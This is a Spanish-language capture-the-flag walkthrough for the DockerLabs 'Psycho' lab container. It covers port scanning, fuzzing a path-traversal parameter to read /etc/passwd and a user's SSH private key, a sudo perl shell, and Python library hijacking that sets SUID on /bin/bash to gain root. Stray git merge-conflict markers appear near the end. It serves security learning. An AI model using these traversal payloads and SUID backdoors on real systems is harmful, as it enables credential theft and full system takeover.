# Máquina Psycho

- Nivel: Fácil

## Reconocimiento

<p>Lo primero que haremos será confirmar la correcta iniciación del contenedor</p>

```shell

ping -c1 172.17.0.2

```

```shell

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.071 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.071/0.071/0.071/0.000 ms


```

<p>La máquina recibe y envia la traza ICMP correctamente por lo que procedemos al escaneo de puertos</p>

```shell
nmap -p- --open -sS -sCV -vvv -n -Pn 172.17.0.2

```
```shell

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 00:07 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Initiating ARP Ping Scan at 00:07
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:07, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:07
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:07, 1.41s elapsed (65535 total ports)
Initiating Service scan at 00:07
Scanning 2 services on 172.17.0.2
Completed Service scan at 00:07, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 172.17.0.2.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.23s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000090s latency).
Scanned at 2025-02-11 00:07:14 CET for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLmfDz6T3XGKWifPXb0JRYMnpBIhNV4en6M+lkDFe1l/+EjBi+8MtlEy6EFgPI9TZ7aTybt2qudKJ8+r3wcsi8w=
|   256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtGVi9ya8KY3fjIqNDQcC9RuW20liVFDd+uUEgllPzQ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
           
```


<p>Como podemos ver en el escaneo el puerto 80 esta abierto por lo que podemos suponer que hay una web corriendo en la máquina</p>

## Página Web

<p>Tras introducir la ip en el navegador obtenemos la siguiente páguina web</p>

![captura_4You1](https://github.com/dancs334/ciber/blob/main/capturas/4You_1.png)

<p>La página no cuenta con ninguna funcionalidad.</p>
<p>Podemos observar que al final de la página hay un mensaje de error</p>

![captura_4You2](https://github.com/dancs334/ciber/blob/main/capturas/4You_2.png)

<p>Al ver el código de la página vemos lo siguiente: </p>

```shell
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>4You</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="main.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">I <3 DockerLabs</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-instagram"></i></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-facebook"></i></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-linkedin"></i></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link btn btn-outline-light" href="#">Join Now</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <header class="hero-section text-white text-center d-flex align-items-center">
        <div class="container">
            <h1 class="display-4">By TLuisillo_o</h1>
            <p class="lead">A home for people who strive to look, feel, and perform their very best.</p>
            <a href="#" class="btn btn-primary mt-3">Book Your Visit</a>
        </div>
    </header>

    <section class="about-section py-5">
        <div class="container text-center">
            <h2>Welcome to this CTF</h2>
            <p>Experience the ultimate in lorem and quiero un mundo de caramelo.</p>
        </div>
    </section>

    <footer class="bg-dark text-white text-center py-4">
        <div class="container">
            <p>&copy; 2024 @TLuisillo_o & DockerLabs</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>

</body>
</html>

[!] ERROR [!] 
```
<p>Por lo que podemos suponer que hay una parte de la web que no se esta cargando correctamente</p>

## Busqueda de directorios

<p>El siguiente paso que seguiremos será buscar esa parte que no se carga correctamente, para ello aplicaremos fuerza bruta con dirbuster</p>

![captura_4You3](https://github.com/dancs334/ciber/blob/main/capturas/4You_3.png)

<p>Este nos reporta varias cosas interesantes. Tenemos el directorio assets e index.php</p>

![captura_4You4](https://github.com/dancs334/ciber/blob/main/capturas/4You_4.png)

<p>El directorio assets no contiene nada interesante</p>

![captura_4You5](https://github.com/dancs334/ciber/blob/main/capturas/4You_5.png)

<p>Buscaremos el error al cargar la página dentro del index.php. Para ello volveremos a aplicar fuerza bruta, esta vez con wfuzz</p>

```shell
wfuzz -c -t 200 --hc 404 --hw 169 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2/index.php?FUZZ=../../../../../../../../../etc/passwd

```
```shell
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?FUZZ=../../../../../../../../../etc/passwd
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000004819:   200        88 L     199 W      3870 Ch     "secret" 

```

<p>El programa nos reporta que la variable "secret" nos devuelve una página mayor que la página que se nos muestra por defecto</p>

![captura_4You6](https://github.com/dancs334/ciber/blob/main/capturas/4You_6.png)


<p>Vemos dos usuarios dentro de passwd "luisillo" y "vaxei"</p>

<p>Tratamos de obtener el id_rsa de luisillo sin exito, por lo que tras probar lo mismo con vaxei obtenemos lo siguiente: </p>

![captura_4You7](https://github.com/dancs334/ciber/blob/main/capturas/4You_7.png)

<p>Creamos un archivo llamado id_rsa en nuestro .ssh y tratamos de conectarnos</p>

```shell
ssh vaxei@172.17.0.2
```

```shell
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:KZdmmK93JpQdEgEdRl0JYVD4l+Gdfix6KM9aUmZc1lA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@32fca1d7c92f:~$ 
```
## Escalada de privilegios

```shell
vaxei@32fca1d7c92f:~$ sudo -l
```

```shell
Matching Defaults entries for vaxei on 32fca1d7c92f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on 32fca1d7c92f:
    (luisillo) NOPASSWD: /usr/bin/perl
```
<p>Vemos que podemos ejecutar perl como el usuario luisillo, para conseguir una shell con este usuario utilizarmos el siguiente comando:</p>

```shell
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash -i";'
```

```shell
luisillo@32fca1d7c92f:/home/vaxei$ whoami
luisillo
```
<p>Ahora que somos el usuario luisillo buscamos de nuevo una forma de loguearnos como root</p>

```shell
luisillo@32fca1d7c92f:~$ sudo -l
```
```shell
Matching Defaults entries for luisillo on 32fca1d7c92f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 32fca1d7c92f:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py

```
<p>La salida nos muestra que podemos ejecutar el programa /opt/paw.py como el usuario root</p>
<p>El programa es el siguiente: </p>

```python
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()
    
    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()

```
<p>Al ejecuar el programa nos aparece la siguiente salida:</p>

```shell
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
```
### Python Library Hijacking

```shell
luisillo@32fca1d7c92f:/opt$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
<p>Como podemos observar las librerias importadas en el programa no estan en el path lo que abre la puerta a un Python Library Hijacking</p>
<p>Esto es debido a que el primer sitio donde se buscan las librerias es el directorio local por lo que crearemos un archivo python llamado "subprocess.py"</p>

```shell
luisillo@32fca1d7c92f:/opt$nano subprocess.py
```
<p>Introducimos el siguiente script el cual nos activa el bit SetUID y luego nos lanza una bash </p>

```python
import os

os.system("chmod u+s /bin/bash")
os.system("bash -p")
```
<p>Lanzamos el programa con el siguiente comando</p>
<<<<<<< HEAD
=======

>>>>>>> origin/main
```shell
luisillo@32fca1d7c92f:/opt$ sudo -u root /usr/bin/python3 paw.py 
```
<p>Nos devuelve una bash con el usuario root</p>
<<<<<<< HEAD
=======

>>>>>>> origin/main
```shell
root@32fca1d7c92f:/opt# whoami
root
```

